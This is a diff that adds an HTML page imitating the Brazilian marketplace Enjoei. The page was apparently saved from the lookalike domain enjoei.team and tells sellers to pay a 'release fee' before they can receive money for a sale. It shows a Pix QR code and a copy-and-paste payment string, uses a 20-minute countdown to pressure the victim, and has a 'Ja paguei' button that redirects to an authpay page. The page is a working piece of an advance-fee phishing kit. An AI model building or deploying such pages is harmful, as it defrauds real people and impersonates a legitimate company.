@@ -1,0 +1,469 @@
+
+<!DOCTYPE html>
+<!-- saved from url=(0074)https://enjoei.team/?enjoei_page=pay&ssid=d41d8cd98f00b204e9800998ecf8427e -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ENJOEI  - Pay</title>
+</head>
+<body class="is-v4 p-sessions-new" data-namespace="false" data-controller="sessions" data-action="new" style="transition: padding 250ms ease 0s;" cz-shortcut-listen="true">
+    
+
+
+
+
+
+
+    
+    <meta name="description" content="O site mais simpático para comprar e vender online roupas, sapatos e bolsas! Marcas Zara, Farm, Nike. Baixe o app e vem conferir!">
+    <title>Informacoes de recebimentos - enjoei</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" media="all" href="../src/ENJOEI - Pay_files/font-face-a567ff9bf44e72db071f08f1193b637d95ebb94fcd8b209c8d13b00cadf8edcb.css">
+    <link rel="stylesheet" media="all" href="../src/ENJOEI - Pay_files/1525-1c556dee.css">
+    <link rel="stylesheet" media="all" href="../src/ENJOEI - Pay_files/web-4f17523d.css">
+    <link rel="stylesheet" media="all" href="../src/ENJOEI - Pay_files/application-94184e2e7658e310ec7f68fc4693056639b5f56f264fac23032cf85df1229679.css">
+
+
+
+
+    <svg style="position: absolute; width: 0; height: 0;" width="0" height="0" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+        <defs></defs>
+    </svg>
+    <div class="t-relative"> </div>
+    <div data-vue="flash-message">
+        <div class="c-flash-message" style="display: none;">
+            <div href="" class="c-flash-message__content o-container" image-url="" data-testid="flash-message">
+                <span class="o-text -xs-white -xs-long-primer t-xs-block t-md-inline c-flash-message__title -xs-medium"></span>
+            </div>
+        </div>
+    </div>
+    <style>
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f8f8f8;
+    color: #333;
+    line-height: 1.6;
+}
+
+/* Container principal */
+.o-container {
+    max-width: 100%;
+    padding: 0 16px;
+    margin: 0 auto;
+}
+
+/* Header */
+.c-clean-header {
+    background-color: #fff;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+    padding: 12px 0;
+    position: relative;
+    z-index: 100;
+}
+
+.c-clean-header__wrapper {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.o-logo.-enjoei {
+    width: 100px;
+    height: 24px;
+}
+
+/* Seção de pagamento */
+.session-wrapper {
+    max-width: 500px;
+    margin: 40px auto;
+    background-color: #fff;
+    border-radius: 8px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+    padding: 24px;
+}
+
+.session-header {
+    text-align: center;
+    margin-bottom: 24px;
+}
+
+.session-title {
+    font-size: 24px;
+    font-weight: 700;
+    color: #61005D;
+    margin-bottom: 8px;
+}
+
+.session-text {
+    font-size: 16px;
+    color: #666;
+    margin: 0;
+}
+
+/* Formulário */
+.l-form {
+    margin-top: 24px;
+}
+
+.o-form__field {
+    margin-bottom: 16px;
+}
+
+.l-label {
+    display: block;
+    font-size: 14px;
+    font-weight: 600;
+    margin-bottom: 8px;
+    color: #333;
+}
+
+.o-input {
+    width: 100%;
+    padding: 12px 16px;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    font-size: 16px;
+    transition: border-color 0.3s;
+}
+
+.o-input:focus {
+    border-color: #61005D;
+    outline: none;
+}
+
+/* Botões */
+.o-button {
+    display: block;
+    width: 100%;
+    padding: 14px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+    text-align: center;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+.o-button.-xs-primary {
+    background-color: #61005D;
+    color: white;
+    border: none;
+}
+
+.o-button.-xs-primary:hover {
+    background-color: #4a0047;
+}
+
+.o-button.-xs-link {
+    background: none;
+    color: #61005D;
+    text-decoration: underline;
+    border: none;
+}
+
+/* QR Code */
+.separator {
+    display: block;
+    text-align: center;
+    margin: 20px 0;
+    color: #999;
+    font-size: 14px;
+    position: relative;
+}
+
+.separator:before,
+.separator:after {
+    content: "";
+    display: inline-block;
+    width: 30%;
+    height: 1px;
+    background-color: #eee;
+    position: absolute;
+    top: 50%;
+}
+
+.separator:before {
+    left: 0;
+}
+
+.separator:after {
+    right: 0;
+}
+
+/* Contador */
+.contador {
+    font-size: 18px;
+    font-weight: 600;
+    color: #61005D;
+    text-align: center;
+    margin: 20px 0;
+    padding: 10px;
+    background-color: #f5f5f5;
+    border-radius: 4px;
+}
+
+/* Rodapé */
+.o-text.-xs-minion {
+    font-size: 12px;
+    color: #999;
+    text-align: center;
+    margin-top: 24px;
+}
+
+.o-text.-xs-minion a {
+    color: #61005D;
+    text-decoration: none;
+}
+
+/* Alertas */
+.alert-bubble {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: rgba(97, 0, 93, 0.9);
+    color: white;
+    padding: 12px 24px;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    z-index: 1000;
+    display: none;
+    animation: fadeIn 0.3s;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+/* Responsividade */
+@media (max-width: 480px) {
+    .session-wrapper {
+        margin: 20px auto;
+        padding: 16px;
+    }
+    
+    .session-title {
+        font-size: 20px;
+    }
+    
+    .session-text {
+        font-size: 14px;
+    }
+    
+    .o-button {
+        padding: 12px;
+    }
+}
+
+/* Estilo para o input quando há erro */
+.erro {
+    border-color: #ff4d4d !important;
+}
+
+.mensagem-erro {
+    color: #ff4d4d;
+    font-size: 13px;
+    margin-top: 5px;
+    display: none;
+}
+
+/* Well (caixas de fundo cinza) */
+.o-well {
+    background-color: #f9f9f9;
+    border-radius: 4px;
+    padding: 16px;
+    margin-bottom: 16px;
+}
+
+.checkbox-wrapper {
+    display: flex;
+    align-items: center;
+}
+    </style>
+    <script>
+            setTimeout( () =>{
+                document.querySelector('.logo-banner').remove()
+            },1500)
+        </script>
+        <style>
+            .logo-banner svg{
+                animation: bounce .8s ease infinite;
+
+            }
+            @keyframes bounce {
+                0%{
+                    opacity: 0;
+                }
+                50%{
+                    opacity: .5;
+                }
+                100%{
+                    opacity: 1;
+                }
+            }
+        </style>
+        <div class="logo-banner" style="position: absolute; inset: 0; background: #fff; left: 0; top: 0%; z-index: 999; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center">
+            <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="none"><path fill="#61005D" fill-rule="evenodd" d="M1.25 14.19C1.25 5.845 6.813-.005 15.002-.005s13.752 5.85 13.741 14.193c0 .96-.033 1.943-.143 2.749H1.393c-.11-.806-.143-1.8-.143-2.749m20.485-2.197c-.343-4.348-3.135-6.147-6.733-6.147s-6.39 1.799-6.733 6.147zM8.093 20.37c1.644 2.45 3.874 3.763 6.909 3.763s5.265-1.313 6.91-3.763l5.198 3.002c-2.561 5.088-7.428 6.622-12.108 6.622S5.455 28.46 2.894 23.372z" clip-rule="evenodd"></path></svg>
+        </div>
+    <section data-vue="sessions-new-page">
+        <div data-v-7bcf1476="" class="o-container -with-gutter l-container">
+            <div data-v-7bcf1476="" class="session-wrapper">
+                <div data-v-7bcf1476="">
+                    <header data-v-4226538e="" data-v-7bcf1476="" class="session-header">
+                        <h1 data-v-4226538e="" class="session-title">
+                        REALIZE O PAGAMENTO
+
+                        </h1>
+                        <p data-v-4226538e="" class="session-text">
+                            Pague a taxa de liberação e receba o valor da sua venda!
+                        </p>
+                    </header>
+                </div>
+                <div data-v-7bcf1476=""></div>
+                <div data-v-7bcf1476="" style="">
+                    <div data-v-7bcf1476="" class="l-wrapper">
+                        <!-- <form data-v-7bcf1476="" action="#" method="post" accept-charset="utf-8" id="login_user" novalidate="novalidate" data-validate-on="submit" class="o-form l-form" onsubmit="submitForm(event)"> -->
+                            <input data-v-7bcf1476="" name="utf8" type="hidden" value="✓">
+                            <input data-v-7bcf1476="" type="hidden" name="authenticity_token" value="iKVQdiyYPEusrrS/sBDMD+YlR+u8eBMXDPzVQHyoUhb+5hUY5bLsahiCEgCuCOz2daHp4GvMJuU7bOEwxhx1uw==">
+                            <input data-v-7bcf1476="" type="hidden" name="user_tracking_uuid" value="aba1a12a-006e-4862-91fb-af630091c401-1720133651762">
+                            <style>
+        .contador {
+            font-size: 24px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+        }
+        .contador .fa-clock {
+            margin-right: 5px; /* Espaço entre o ícone e o texto do contador */
+            color: black; /* Cor do ícone */
+        }
+ /* Estilos para a bolha de alerta */
+ .alert-bubble {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(249, 164, 178, 0.9); /* Cor de fundo rosa com transparência */
+            color: #fff; /* Cor do texto */
+            padding: 10px 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            display: none; /* Inicialmente invisível */
+            z-index: 1000; /* Z-index alto para garantir que fique acima de outros elementos */
+        }
+    </style>
+
+                          
+
+                            <div data-v-7bcf1476="" class="o-form__field l-field">
+                            <div id="contador" class="contador">19:57</div>
+    <!-- <p>.</p> -->
+                                <!-- <label data-v-7bcf1476="" for="user_line" class="l-label"> Aceitamos diversos bancos </label> -->
+                                <center>
+                                <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&amp;data=00020126850014br.gov.bcb.pix2563pix.voluti.com.br/qr/v3/at/5438b624-716b-4075-9860-4387f74c24ea5204000053039865802BR5925PAGFACIL_MEIOS_DE_PAGAMEN6005SINOP62070503***63047DC1" style="width: 220px; height:200px;" alt="">
+                                </center>
+                            </div>
+                            <span data-v-7771531a="" class="separator">QR</span>
+                              <div data-v-7bcf1476="" class="o-form__field l-field">
+                                <label data-v-7bcf1476="" for="user_phone" class="l-label"> COPIA E COLA </label>
+                                <input id="valorParaCopiar" data-v-7bcf1476="" data-validate="true" data-patterns="isNonEmpty, isLongerThan" data-test="input-password" type="text" name="user[password]" autocomplete="current-password" value="00020126850014br.gov.bcb.pix2563pix.voluti.com.br/qr/v3/at/5438b624-716b-4075-9860-4387f74c24ea5204000053039865802BR5925PAGFACIL_MEIOS_DE_PAGAMEN6005SINOP62070503***63047DC1" maxlength="15" oninput="formatCelular(this)" class="o-input -fill -xs-medium -md-large" required="">
+                            </div>
+
+                            <div data-v-7bcf1476="" class="o-well checkbox-wrapper">
+                                <div data-v-7bcf1476="" class="o-grid__item">
+                            <div id="mensagem-erro" style="color: red;"></div>
+                                    
+                                </div>
+                            </div>
+                            <div data-v-7bcf1476="" class="o-well">
+                            <button data-v-7bcf1476="" data-test="button-login-entrar" class="o-button -xs-flat -xs-large -xs-fill t-lowercase -xs-primary" onclick="copiarValor()">COPIAR</button>
+                            </div>
+                            <div id="alertaCopiado" class="alert-bubble">
+        Pix copiado! Faça o pagamento.
+    </div>
+                        <!-- </form> -->
+                        <div data-v-7bcf1476="">
+                            <!-- <a data-v-7bcf1476="" data-modal="trigger" data-target="reset-password" class="o-button -xs-link -xs-large -xs-fill js-ui-fixed-content-open t-lowercase reset-password" href=""> Esqueci a senha </a> -->
+                        </div>
+
+                        <div data-v-7771531a="" data-v-7bcf1476="">
+                            <span data-v-7771531a="" class="separator">ou</span>
+                            <div data-v-7bcf1476="" class="o-well">
+                            <button data-v-7bcf1476="" data-test="button-login-entrar" class="o-button -xs-flat -xs-large -xs-fill t-lowercase -xs-primary" onclick="pay()">Ja paguei</button>
+                            </div>
+                            <p data-v-7bcf1476="" class="o-text -xs-minion -xs-regular -xs-center">protegido por reCAPTCHA - <a data-v-7bcf1476="" href="#" target="_blank">privacidade</a> - <a data-v-7bcf1476="" href="#" target="_blank">condições</a></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <script>
+
+        function pay(){
+            const hash = localStorage.getItem('hash');
+            window.location.href = `../authpay/?ssid=${hash}`;
+        }
+
+    function copiarValor() {
+        // Seleciona o texto dentro do input
+        const input = document.getElementById('valorParaCopiar');
+        input.select();
+        
+        // Copia o texto selecionado para a área de transferência
+        document.execCommand('copy');
+
+        // Mostra a bolha de mensagem
+        const alerta = document.getElementById('alertaCopiado');
+        alerta.style.display = 'block';
+
+        // Define um temporizador para ocultar a bolha após alguns segundos (opcional)
+        setTimeout(() => {
+            alerta.style.display = 'none';
+        }, 2000); // 3000 milissegundos = 3 segundos
+    }
+        // Função para iniciar o contador regressivo
+        function iniciarContador() {
+            // Define o tempo inicial em segundos (20 minutos = 1200 segundos)
+            let tempoRestante = 1200;
+
+            // Atualiza o contador a cada segundo
+            const intervalo = setInterval(() => {
+                // Calcula minutos e segundos
+                const minutos = Math.floor(tempoRestante / 60);
+                let segundos = tempoRestante % 60;
+
+                // Formata os segundos para exibir sempre com dois dígitos (ex: 01, 02, ..., 59)
+                const segundosFormatados = segundos < 10 ? `0${segundos}` : segundos;
+
+                // Atualiza o elemento HTML com o tempo restante formatado
+                document.getElementById('contador').textContent = `${minutos}:${segundosFormatados}`;
+
+                // Decrementa o tempo restante
+                tempoRestante--;
+
+                // Se o tempo restante acabou, limpa o intervalo e executa ação adicional (ex: redirecionamento)
+                if (tempoRestante < 0) {
+                    clearInterval(intervalo);
+                    document.getElementById('contador').textContent = 'Tempo esgotado!';
+                    // Aqui você pode adicionar mais ações, como redirecionar ou mostrar uma mensagem
+                }
+            }, 1000); // 1000 milissegundos = 1 segundo
+        }
+
+        // Inicia o contador quando a página carrega
+        window.onload = function() {
+            iniciarContador();
+        };
+    </script>
+    <script src="../src/ENJOEI - Pay_files/md5.min.js.download"></script>
+
+
+
+
+
+
+</body></html>
